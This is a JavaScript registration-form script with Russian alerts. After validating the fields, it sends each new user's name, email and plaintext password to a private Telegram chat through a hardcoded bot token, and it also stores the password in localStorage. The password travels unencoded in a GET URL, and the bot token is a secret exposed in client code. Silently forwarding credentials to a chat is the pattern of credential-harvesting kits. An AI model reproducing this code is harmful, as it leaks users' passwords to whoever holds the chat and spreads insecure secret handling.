if (localStorage.getItem('user')) {
	window.location.href = '/index.html'
}

const form = document.querySelector('form')
const name = document.querySelector('#username')
const gmail = document.querySelector('#email')
const password = document.querySelector('#password')
const confirm_password = document.querySelector('#confirm-password')

form.addEventListener('submit', event => {
	event.preventDefault()
	if (
		name.value.trim() == '' ||
		gmail.value.trim() == '' ||
		password.value.trim() == '' ||
		confirm_password.value.trim() == ''
	) {
		alert('Введите все данный')
		return
	}

	if (name.value.trim() == '') {
		alert('Введите имя')
		name.focus()
		return
	}

	const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
	if (!emailRegex.test(gmail.value.trim())) {
		alert('Введите корректный email')
		return
	}

	if (password.value !== confirm_password.value) {
		alert('Пароли не совпадают')
		return
	}

	localStorage.setItem('name', name.value.trim())

	const message = `
	 Новый пользователь зарегистрирован:%0A
	 Имя: ${name.value.trim()} %0A
	 Email: ${gmail.value.trim()} %0A
	 Пароль: ${password.value.trim()} 
	`

	localStorage.setItem('user', JSON.stringify({ message }))

	const token = '7973885064:AAE7UPJXhxOnPbX6dgWI7L73rPwA7ahCh1Y'
	const chat_id = '5760837257'

	let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`

	let api = new XMLHttpRequest()
	api.open('GET', url, true)
	api.send()

	name.value = ''
	gmail.value = ''
	password.value = ''
	confirm_password.value = ''
	alert('Форма успешно отправлена!')
	window.location.href = '/index.html'
})

// export { message }
